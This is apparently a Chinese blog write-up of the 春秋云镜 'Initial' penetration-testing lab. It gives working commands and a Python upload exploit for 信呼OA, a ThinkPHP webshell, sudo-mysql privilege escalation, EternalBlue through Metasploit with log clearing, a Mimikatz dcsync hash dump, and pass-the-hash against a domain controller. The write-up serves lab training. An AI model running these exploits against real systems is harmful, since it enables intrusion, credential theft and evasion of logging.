+++
date = '2025-03-12T22:03:55+08:00'
title = '春秋云镜-Initial-Writeup'
categories = ["Writeup"]
tags = ["writeup", "渗透", "春秋云镜"]

+++



> 参考文章
>
> https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/

菜鸡第一个通关的靶场Orz



### FLAG1

![image-20250306184027336](../assets/image-20250306184027336.png)

fscan扫一下

```
./fscan.exe -h 39.99.139.119
```

![image-20250306184106697](../assets/image-20250306184106697.png)

直接用thinkphpgui写马连蚁剑

![image-20250306185409381](../assets/image-20250306185409381.png)

先用vshell上线

读flag需要提权

[peass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)](https://github.com/peass-ng/PEASS-ng)

传个linpeas扫一下

```
./linpeas_linux_amd64 > output.txt
```

![image-20250306194842802](../assets/image-20250306194842802.png)

在历史文件中找到疑似读flag的命令

其实这就是一个简单的sudo提权

[渗透测试：Linux提权精讲（三）之sudo方法第三期_nmap sudo 提权-CSDN博客](https://blog.csdn.net/Bossfrank/article/details/132035121)

![image-20250307122848818](../assets/image-20250307122848818.png)

mysql 是配置了 sudo 免密使用的，可以使用 mysql 提权，通过mysql执行命令来读flag

payload:

```
sudo mysql -e '\! /bin/sh'
cat /root/flag/flag*
```

![image-20250306195324340](../assets/image-20250306195324340.png)

```
flag01: flag{60b53231-
```





接下来搭代理

![image-20250306195729122](../assets/image-20250306195729122.png)

查内网ip

![image-20250306201310152](../assets/image-20250306201310152.png)



接着传一个fscan扫一下内网

```
fs -h 172.22.1.0/24 -nobr -nopoc -hn 172.22.1.15
```

![image-20250306211420165](../assets/image-20250306211420165.png)

收集到的信息

```
172.22.1.2:DC域控
172.22.1.21:Windows的机器并且存在MS17-010 漏洞
172.22.1.18:信呼OA办公系统
```



### FLAG2

先看信呼

![image-20250306201640184](../assets/image-20250306201640184.png)

弱口令成功登入admin/admin123

信呼协同办公系统v2.2.8存在文件上传漏洞

[Awesome-POC/OA产品漏洞/信呼OA qcloudCosAction.php 任意文件上传漏洞.md at master · Threekiii/Awesome-POC](https://github.com/Threekiii/Awesome-POC/blob/master/OA产品漏洞/信呼OA qcloudCosAction.php 任意文件上传漏洞.md)

```php
import requests

session = requests.session()
url_pre = 'http://172.22.1.18/'
url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
# url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=<ID>'
data1 = {
    'rempass': '0',
    'jmpass': 'false',
    'device': '1625884034525',
    'ltype': '0',
    'adminuser': 'YWRtaW4=',
    'adminpass': 'YWRtaW4xMjM=',
    'yanzm': ''    
}

r = session.post(url1, data=data1)
r = session.post(url2, files={'file': open('1.php', 'r')})
filepath = str(r.json()['filepath'])
filepath = "/" + filepath.split('.uptemp')[0] + '.php'
print(filepath)
id = r.json()['id']
url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'
r = session.get(url3)
r = session.get(url_pre + filepath + "?1=system('dir');")
print(r.text)
```

写马之后直接读flag就行

![image-20250306205702520](../assets/image-20250306205702520.png)

```
flag02: 2ce3-4813-87d4-
```







### FLAG3

永恒之蓝可以用msf打

现在kali上用proxychains4简单配个代理

```
proxychains4 msfconsole
search ms17-010
```

有四个不同的模块

![image-20250306221317959](../assets/image-20250306221317959.png)

这里使用第一个模块，因为利用范围比较广

```
use exploit/windows/smb/ms17_010_eternalblue  # 选择使用的模块
set payload windows/x64/meterpreter/bind_tcp_uuid  # 设置payload，可以通过show payloads查看
set RHOSTS 172.22.1.21  # 设置靶机的ip
exploit  # 发起攻击
```

![image-20250306222652987](../assets/image-20250306222652987.png)

成功了

```
meterpreter > screenshot # 捕获屏幕
meterpreter > upload hello.txt c:// #上传文件
meterpreter > download d://1.txt # 下载文件
meterpreter > shell # 获取cmd
meterpreter > clearev # 清除日志
```

![image-20250306222939898](../assets/image-20250306222939898.png)



```
load kiwi  # 调用mimikatz模块
kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit  # 导出域内所有用户的信息(包括哈希值)
```

![image-20250306223200316](../assets/image-20250306223200316.png)

拿到`Administrator` 用户的 `hash`，接着使用 `crackmapexec` 来进行哈希传递攻击，来实现 `DC域控` 上的任意命令执行

```
proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
```

![image-20250306223612158](../assets/image-20250306223612158.png)

拿到最后一个flag